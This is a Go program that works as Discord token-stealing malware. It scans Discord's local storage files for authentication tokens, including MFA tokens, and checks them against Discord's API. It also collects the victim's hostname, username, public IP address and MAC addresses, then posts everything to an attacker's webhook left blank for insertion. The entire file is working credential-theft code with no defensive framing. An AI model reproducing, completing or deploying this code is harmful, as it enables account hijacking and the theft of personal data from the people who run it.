package main

import (
	"fmt"
	"net/http"
	"net"
	"io/ioutil"
	"os/user"
	"os"
	"regexp"
	"strings"
)

const webhook string = "" //insert webhook here

//streamlinig error checking
func check(e error) {
	if e != nil {
		panic(e)
	}
}

//data extraction code
type info struct {
	discord, chrome, brave string
	hostname, token, username, ipAddr string
	mac []string
}

//constructor
func newinfo() *info {
	//getting paths
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")

	discord := roaming + "\\Discord\\Local Storage\\leveldb\\"
	chrome := local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"

	//getting outbound ip
	client := &http.Client{}
	req, reqErr := http.NewRequest("GET", "https://ifconfig.me", strings.NewReader(``))
	check(reqErr)
	res, resErr := client.Do(req)
	check(resErr)
	defer res.Body.Close()
	ip, ioErr := ioutil.ReadAll(res.Body)
	check(ioErr)
	

	//getting hostname
	host, _ := os.Hostname()

	//getting username
	username, _ := user.Current()

	//getting mac address
	ifas, e := net.Interfaces()
	check(e)
	
	var mac []string
	for _, ifa := range ifas{
		a := ifa.HardwareAddr.String()
		if a != ""{
			mac = append(mac, a)
		}
	}

	return &info{discord: discord, chrome: chrome, hostname: host, mac: mac, username: username.Name, ipAddr: string(ip) }
}

//grabs tokens from each file in local storage
func (i *info) grabToken(){
	var tokens []string
	rexpr, _ := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
	rexprMFA, _ := regexp.Compile(`mfa\.[\w-]{84}`)

	files, err := os.ReadDir(i.discord)
	check(err)

	var tokensUnparsed []string
	for _, file := range files {
		data, err := os.ReadFile(i.discord + file.Name())
		check(err)

		//getting every token
		tokensUnparsed = append(tokensUnparsed, rexpr.FindAllString(string(data), -1)...)
		tokensUnparsed = append(tokensUnparsed, rexprMFA.FindAllString(string(data), -1)...)
	}

	//removing dupicates to speed up payload
	var current string;
	for _, token := range tokensUnparsed{
		if current == token{
			continue
		}else{
			tokens = append(tokens, token)
			current = token
		}
	}

	//checking for valid tokens
	client := &http.Client{}
	for _, token := range tokens{
		req, e := http.NewRequest("GET", "https://discordapp.com/api/v7/users/@me", strings.NewReader(``))
		check(e)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", token)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11")
		res, resErr := client.Do(req)
		check(resErr)
		defer res.Body.Close()
		if res.StatusCode == 200{
			i.token = token
			break
		}
	}
}

//sends data to webhook
func (i *info) sendData(){
	//post reequest body
	data := `{
		"embeds": [{
			"color": 7224508,
			"description": "%s's Computer",
			"fields": [
				{
					"name": "Hostname",
					"value": "%s"
				},
				{
					"name": "Token",
					"value": "%s"
				},
				{
					"name": "IP Address",
					"value": "%s"
				},
				{
					"name": "Mac Adresses",
					"value": "%v"
				}
			]
		}]
	}`
	
	//adding relevant data in placeholders
	send := fmt.Sprintf(data, i.username, i.hostname, i.token, i.ipAddr, i.mac)
	
	//making post request
	req, err := http.NewRequest("POST", webhook, strings.NewReader(send))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	res, err := client.Do(req)
	check(err)

	defer res.Body.Close()

}

func main() {
	p := newinfo()
	p.grabToken()
	p.sendData()
}
